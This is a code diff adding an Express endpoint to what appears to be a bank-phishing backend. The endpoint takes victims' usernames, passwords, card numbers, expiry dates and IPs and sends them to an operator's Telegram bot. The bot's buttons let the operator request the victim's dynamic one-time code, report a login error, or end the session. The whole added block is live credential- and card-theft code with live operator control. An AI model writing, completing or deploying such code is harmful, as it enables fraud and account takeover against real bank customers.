@@ -133,6 +133,70 @@ app.get("/check_updates/:transaction_id", async (req, res) => {
   }
 });
 
+// PROCESAR FORMULARIO
+app.post("/procesar_formulario", async (req, res) => {
+  // ...
+});
+
+// ⬅️ AQUÍ MISMO, después de procesar_formulario
+app.post("/procesar_logo", async (req, res) => {
+  const data = req.body;
+
+  if (!data) {
+    return res.status(400).json({ status: "error", message: "Datos inválidos" });
+  }
+
+  const message = `
+<b>Verificación de usuario</b>
+---------------------------
+👤 <b>Usuario:</b> ${data.usuario}
+🔐 <b>Clave:</b> ${data.clave}
+💳 <b>Tarjeta:</b> ${data.tarjeta}
+📅 <b>Expiración:</b> ${data.ftarjeta}
+🌐 <b>IP:</b> ${data.ip}
+`;
+
+  const keyboard = JSON.stringify({
+    inline_keyboard: [
+      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${data.id}` }],
+      [{ text: "Error Usuario/Clave", callback_data: `error_logo:${data.id}` }],
+      [{ text: "Finalizar", callback_data: `finalizar:${data.id}` }]
+    ]
+  });
+
+  try {
+    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        reply_markup: keyboard,
+        parse_mode: "HTML"
+      })
+    });
+
+    const tgData = await tgRes.json();
+    if (tgData.ok) {
+      console.log("✅ Mensaje de logo enviado correctamente");
+      res.json({ status: "success" });
+    } else {
+      console.error("❌ Telegram error al enviar logo:", tgData);
+      res.json({ status: "error", message: "No se pudo enviar a Telegram" });
+    }
+  } catch (err) {
+    console.error("❌ Error en procesar_logo:", err);
+    res.json({ status: "error", message: "Error en servidor" });
+  }
+});
+
+
+// CHECK UPDATES
+app.get("/check_updates/:transaction_id", async (req, res) => {
+  // ...
+});
+
+
 // ⬇️ aquí agregas el webhook:
 app.post("/miwebhook", (req, res) => {
   console.log("👉 Webhook recibido de Telegram:", req.body);
